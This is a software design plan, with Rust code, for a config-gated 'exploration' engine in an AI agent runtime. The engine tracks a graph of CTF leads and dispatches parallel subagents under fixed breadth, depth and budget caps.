crates/builder_domain/src/tools/catalog.rs        (add ExploreToolInput)
crates/builder_domain/src/tools/descriptions/explore.md  (new)
crates/builder_app/src/tool_executor.rs           (execute_explore_tool)
crates/builder_app/src/execution_strategy_builder.rs  (select Explore)
crates/builder_domain/src/execution_strategy.rs   (add ExecutionStrategyKind::Explore + contract)
crates/builder_app/src/system_prompt.rs           (doctrine references the frontier + explore tool)
crates/builder_repo/src/skills/ctf-competition/SKILL.md  (frontier discipline)
crates/builder_app/src/mission_control.rs         (frontier snapshot in the note)
crates/builder_config/src/exploration.rs          (new: ExplorationConfig + caps)
crates/builder_ratatui/src/status_row.rs          (frontier segment in the status line)
crates/builder_main/src/ui/info_commands.rs       (`/frontier` command handler)
```

---


This is a large, hard-to-debug change. Every value and policy below is **already decided** — do not re-decide, do not leave a TODO. If a phase seems to need a number or a behavior, it is here.


The entire engine is gated behind one config flag, **default off**. With the flag off, the runtime behaves exactly as today (byte-for-byte).

- Config: new `[exploration]` section → `crates/builder_config/src/exploration.rs`, `struct ExplorationConfig { enabled: bool (default false), max_frontier_nodes: usize (default 256), max_offloads_in_flight: usize (default 2), max_breadth: usize (default 4) }`. Mirror `crates/builder_config/src/engagement.rs` exactly (same derives, `#[serde(default)]`, `JsonSchema`). Field on `BuilderConfig`: `pub exploration: Option<ExplorationConfig>` next to `engagement` (`config.rs:258-260`). Validate in `validate_exploration_config` called from `BuilderConfig::validate()` (`config.rs:467`) using `validate_positive_usize` (`config.rs:337`) for the caps.
- Read accessor: `configured_exploration(config) -> ExplorationConfig` in `crates/builder_app/src/app/profile_resolution.rs` (mirror `configured_engagement_context`, `:93`). Absent section ⇒ `ExplorationConfig::default()` ⇒ disabled.
- **Single gate point:** `execution_strategy_builder.rs` selects `Explore` (Phase 7.2) **only if** `exploration.enabled && (EngagementKind::Ctf || autonomy_profile=="ctf-competition")`. Nowhere else branches on the flag. Flipping it false is a total, instant kill switch.
- Schema: after adding the field, regenerate with `cargo test -p builder_config --test schema` (writes `builder.schema.json`; also update the `public/builder.schema.json` mirror). This is a required step, not optional.


Define these in `crates/builder_domain/src/exploration.rs` as `pub const`, EXCEPT the three that are config-tunable (marked ⚙, read from `ExplorationConfig`). Never hard-code these numbers anywhere else — reference the const.

| Name | Value | Meaning | Enforced in |
| --- | --- | --- | --- |
| `PIVOT_THRESHOLD` | 2 | dead probes before a lead auto-`Exhausted` | `ExplorationNode::register_dead_probe` (Task 0.1) |
| `MAX_BREADTH` ⚙ | 4 | max leads expanded in one BFS fan-out; **must equal** `MAX_PARALLEL_DELEGATED_TASKS` | `decide_next` arg + dispatcher (Phase 2/4) |
| `MAX_FRONTIER_NODES` ⚙ | 256 | hard cap on total nodes per run (prevents unbounded graph) | `Frontier::add_lead` (Task 1.1 + D4) |
| `MAX_OFFLOADS_IN_FLIGHT` ⚙ | 2 | **deferred — Phase 5b only.** Reserved config for the future detached-offload path; unused by the shipped inline-parallel design (offloads share `MAX_BREADTH`) | Phase 5b (not built now) |
| `MAX_EXPLORATION_DEPTH` | 6 | max `ExplorationNode.depth` (graph depth, distinct from `MAX_DELEGATION_DEPTH=2`) | `Frontier::add_lead` rejects deeper leads |
| `SEED_DIGEST_MAX_BYTES` | 2048 | cap on the parent-facts digest injected into a child | `build_seed_digest` (Phase 6.1) |
| `MAX_PROMOTED_PER_CHILD` | 1 | max terminal source-lead state promotions from one child dispatch result; child-created leads should be recorded with `explore add_lead` | `promote_child_result` (Phase 6.2) |
| `MAX_LEAD_TITLE_CHARS` | 120 | truncate lead titles before slugging | `explore` executor (Phase 3.2) |
| `FRONTIER_NOTE_MAX_LEADS` | 6 | leads shown in the model-facing mission-control note | `mission_control` (Phase 8) |

> **Graph depth vs delegation depth (do not conflate):** `MAX_EXPLORATION_DEPTH` (6) bounds how deep the *lead graph* grows. `MAX_DELEGATION_DEPTH` (2, `agent_executor.rs:23`) bounds how deep *runtime subagent nesting* goes. The frontier is driven from the **top-level run** (the orchestrator calls the dispatcher each turn), so expanding a depth-5 lead is still a **depth-1 delegation** from the root — the graph can be 6 deep while every `task` spawn stays within the delegation cap. Never try to represent graph depth by nesting subagents; that would blow the delegation cap at depth 3.


**Decision: no detached tasks in the shipped design.** All exploration subagents — including specialist offloads — are **inline** in the existing `task` fan-out, which runs under one `MpscStream` that `abort()`s on drop (`mpsc_stream.rs:44-52`). This means interrupt (ESC) and run teardown already cancel everything for free, exactly as today. We add **no** registry, **no** RAII cancellation guard, **no** interrupt edges. This is the single biggest risk reduction versus the first draft (see decision record §4 S1, §5).

- **Inline-parallel offload:** a deep-specialist lead is dispatched as **one more `task` in the same assistant turn's fan-out**, running concurrently with the other probes via the existing `join_all` (`tool_registry.rs:353-376`). "Do other work while crypto runs" = the other parallel children in the same turn. No task escapes the turn future, so no new lifecycle code is needed.
- **Concurrency cap:** reuse the existing `Semaphore` (`tool_registry.rs:351`) and `MAX_PARALLEL_DELEGATED_TASKS = 4`. Optionally, unify to a single run-scoped permit pool *only if* the `orch_spec` suite shows the per-parent semaphore is a problem — otherwise leave it exactly as-is (YAGNI).
- **Timeout:** unchanged — delegated agents deliberately bypass the tool timeout (`tool_registry.rs:352`); they are bounded by the per-run request budget (D5).
- **Deferred (NOT built now):** true detached-across-turns offload (a background task that outlives the turn) is a documented optional future phase (**Phase 5b**) behind its own sub-flag. *Only then* do the registry + RAII guard + interrupt handling from the first draft become necessary. Do not build them for the shipped design.

> Why this is safe and sufficient: the user's requirement is "assign crypto to another subagent and keep working." Inline-parallel satisfies it (the main turn keeps issuing other probes alongside crypto). The extra power of detached-across-turns (main agent reasons for many turns while crypto grinds) is real but unproven-necessary, and it is exactly the layer-4 concurrency complexity we are choosing not to pay up front.


- **Frontier size:** `Frontier::add_lead` enforces `MAX_FRONTIER_NODES`. When full, it does **not** insert; it drops the **lowest-score `Frontier`-state** node to make room only if the new lead outscores it, else rejects the new lead. Emit a **warn-once** per run (mirror the `take_warning()` one-shot at `reader.rs:376-383`) so logs don't flood. Never silently exceed the cap.
- **Seed digest:** `build_seed_digest` truncates to `SEED_DIGEST_MAX_BYTES` on a line boundary, appends `… (truncated)` (mirror `truncate_summary_line`, `control.rs:591`).
- **Promotion:** `promote_child_results` promotes at most `MAX_PROMOTED_PER_CHILD` highest-value findings; the rest are recorded as evidence but not turned into frontier nodes (logged at debug).
- **Depth:** `add_lead` rejects (returns the parent id, logs debug) any lead whose depth would exceed `MAX_EXPLORATION_DEPTH`.
- **Idempotency/dedup:** re-adding an existing `node_id` returns the existing id (D-decision in Task 0.1 note) — this is the cycle guard.


Offloaded and foreground exploration children draw from the **same** per-turn budget the runtime already computes (`Ctf => (10,5)` scaled by difficulty, `app/runtime_budget.rs`). Exploration **never raises** a child's caps. Every exploration subagent spawn counts toward the run's `RunBudgetSnapshot` (`control_plane.rs:1068`) exactly like a normal `task` spawn — no separate accounting path.


Every failure has a defined, tested outcome. The run continues; the frontier degrades gracefully.

| Failure | Defined behavior |
| --- | --- |
| Child subagent errors / returns empty | Source node → `Exhausted` (not `Solved`); log warn; continue traversal. Partial output still merged if present (reuse `collect_delegated_agent_output` partial-preserve, `agent_executor.rs:455-468`). |
| A dispatched child (incl. the inline crypto offload) fails | It is an ordinary parallel `task`, so it is handled exactly like any delegated task today (`run_delegated_tasks`/`join_all` already isolates per-child failures); the source node → `Exhausted`, others in the batch are unaffected. No special path. |
| Interrupt (ESC) mid-exploration | Existing `MpscStream` abort-on-drop cancels every in-flight child (all inline); frontier persists at last-written `Lead` event; next run resumes from it (evidence is `run_id`-scoped and durable). No guard needed. |
| Evidence write fails (`append_evidence_item` err on a `Lead` event) | Propagate as `anyhow::Error` out of the `explore`/`dispatch_leads` executor; it logs and returns an error `ToolOutput` — the tool call fails cleanly, the turn continues, frontier state is whatever last persisted. Do not retry in a loop. |
| Frontier full (D4) | Reject/evict per D4 + warn-once; never error. |
| Overlay source persona file missing | `overlay_for` falls back to a generic focus note (category name only); log debug. Never fail dispatch. |
| `decide_next` cursor points at a missing node | Treat as root turn (`current=None`); log debug. Pure function stays total. |


Use the existing `tracing` macros already in `builder_app`. Required spans/events:

```rust
//! Runtime-owned exploration model: a persistent lead graph the orchestrator
//! traverses with an explicit breadth/depth policy. Domain-neutral: category
//! names are generic search buckets, not CTF-only.

use crate::control_plane::RunId;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

/// Number of dead probes on one lead before the runtime forces a pivot.
/// Encodes the long-standing "two dead probes on one idea means pivot" rule.
pub const PIVOT_THRESHOLD: u8 = 2;

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct NodeId(pub String);

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum LeadState {
    Frontier,   // discovered, not yet expanded
    Exploring,  // an agent is actively on it
    Deepening,  // DFS in progress under it
    Exhausted,  // dead end (>= PIVOT_THRESHOLD dead probes)
    Offloaded,  // handed to a dedicated background specialist
    Blocked,    // needs external input
    Solved,     // produced a flag / decisive artifact
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum LeadCategory {
    Recon, Web, Pwn, Crypto, Rev, Forensics, Network, Osint, Misc,
}

impl LeadCategory {
    /// Categories worth handing to a dedicated background specialist because
    /// they are deep, independent, and CPU/skill-heavy.
    pub fn is_deep_specialist(self) -> bool {
        matches!(self, LeadCategory::Crypto | LeadCategory::Rev | LeadCategory::Pwn)
    }

    /// Base priority weight used by the traversal scorer.
    pub fn base_weight(self) -> u16 {
        match self {
            LeadCategory::Recon => 90,
            LeadCategory::Web | LeadCategory::Network => 70,
            LeadCategory::Forensics | LeadCategory::Osint => 55,
            LeadCategory::Crypto | LeadCategory::Rev | LeadCategory::Pwn => 60,
            LeadCategory::Misc => 40,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct LeadScore(pub u16);

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ExplorationNode {
    pub node_id: NodeId,
    pub run_id: RunId,
    pub parent: Option<NodeId>,
    pub depth: u16,
    pub category: LeadCategory,
    pub title: String,
    pub detail: String,
    pub state: LeadState,
    pub score: LeadScore,
    pub dead_probes: u8,
    pub owner_agent: Option<String>,
    pub evidence_refs: Vec<String>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

impl ExplorationNode {
    pub fn new(run_id: RunId, parent: Option<NodeId>, depth: u16,
               category: LeadCategory, title: impl Into<String>, detail: impl Into<String>) -> Self {
        let now = Utc::now();
        let title = title.into();
        let node_id = NodeId(format!("node-{depth}-{}", slug(&title)));
        Self {
            node_id, run_id, parent, depth, category,
            score: LeadScore(category.base_weight()),
            title, detail: detail.into(),
            state: LeadState::Frontier,
            dead_probes: 0, owner_agent: None, evidence_refs: Vec::new(),
            created_at: now, updated_at: now,
        }
    }

    /// Record a probe that produced no new evidence; force a pivot at threshold.
    pub fn register_dead_probe(&mut self) {
        self.dead_probes = self.dead_probes.saturating_add(1);
        self.state = if self.dead_probes >= PIVOT_THRESHOLD {
            LeadState::Exhausted
        } else {
            LeadState::Exploring
        };
        self.updated_at = Utc::now();
    }
}

fn slug(s: &str) -> String {
    s.chars().map(|c| if c.is_alphanumeric() { c.to_ascii_lowercase() } else { '-' }).take(24).collect()
}
```

- [ ] **Step 3: Implement `decide_next`** with this exact priority ladder:

Helper closures (all pure, computed from `nodes`):
- `node(id)` → the `ExplorationNode` with that id (panics only on a caller bug; tests never hit it).
- `open(set)` → `set.filter(state == Frontier)` sorted by `score` desc, then `created_at` asc, then `node_id` asc (stable, total order — no ties, so output is deterministic).
- `children(id)` → `nodes.filter(parent == Some(id))`.
- `siblings(id)` → `nodes.filter(parent == node(id).parent && node_id != id)`.
- `in_flight()` → `nodes.any(state ∈ {Exploring, Deepening, Offloaded})`.
- `any_blocked()` → `nodes.any(state == Blocked)`.

Ladder — evaluate top to bottom, return on first match:

```
STEP 1 — Root turn (cursor.current == None):
    roots = open(nodes where parent == None)
    if roots nonempty        -> return ExpandBreadth(ids(roots).take(max_breadth))

STEP 2 — Depth descent (cursor.mode == Depth, cur = node(cursor.current)):
    kids = open(children(cur.node_id))
    if kids nonempty         -> return Deepen(kids[0].node_id)     // DFS into best fresh child

STEP 3 — Dead-end handling & breadth (cur = node(cursor.current)):
    if cur.state == Exhausted:
        sibs = open(siblings(cur.node_id))
        if sibs nonempty AND cur.parent.is_some()
                             -> return Backtrack { to: cur.parent, mode: Breadth }
        // exhausted with no fresh siblings (local level dead) -> fall through to STEP 4
    else if cursor.mode == Breadth:
        sibs = open(siblings(cur.node_id))
        if sibs nonempty     -> return ExpandBreadth(ids(sibs).take(max_breadth))
        // no fresh siblings -> fall through to STEP 4

STEP 4 — Global reseed / terminate:
    all_open = open(nodes)
    if all_open nonempty     -> return ReseedDepth(all_open[0].node_id)  // best-first dive elsewhere
    if in_flight()           -> return Done       // nothing to schedule now; reaping in-flight re-drives
    if any_blocked()         -> return Escalate    // only blocked leads left, nothing running
    return Done
```

**Why STEP 3 splits Backtrack vs. fall-through (matches the two tests):**
- `exhausted_node_backtracks_...`: the exhausted leaf still has a **fresh sibling** → `Backtrack` to the parent so breadth can pick that sibling up. (Fixture: leaf `Exhausted`, one sibling `Frontier`, shared parent.)
- `siblings_exhausted_reseeds_...`: the exhausted leaf's siblings are **all exhausted** (local branch fully dead) → fall to STEP 4 → `ReseedDepth` to the fresh frontier in the *other* branch. (Fixture: branch A all `Exhausted`, branch B has a `Frontier` node.)

Keep `decide_next` a single referentially-transparent function: **no clock, no repo, no async** — everything is derived from the `nodes` slice passed in. This is what makes all six rules deterministically unit-testable.

**Not a scheduler.** In the chosen design the model decides *which* leads to work and *when*, by calling the `explore` tool with an `op=dispatch` naming one or more `node_id`s. The runtime's job is only to **enrich** that dispatch: build a broad-clone-plus-category-overlay child and seed it with relevant parent facts, then reuse the **existing parallel delegation** (`run_delegated_tasks`, `join_all`) to run them. Breadth = the model lists several `node_id`s in one `dispatch`. Depth = the model dispatches a child lead after seeing its sub-leads. There is **no `drive_once` loop and no `decide_next` execution here** — `decide_next` only feeds the advisory note (Phase 2/8.4).

> **Inline-parallel offload falls out for free:** if the model dispatches `[web, web, crypto]` in one `op=dispatch`, they run concurrently in the same fan-out. The crypto lead is "offloaded and worked while other work proceeds" simply by riding the same parallel batch — no detached tasks, no special offload path (see D3 and Phase 5).
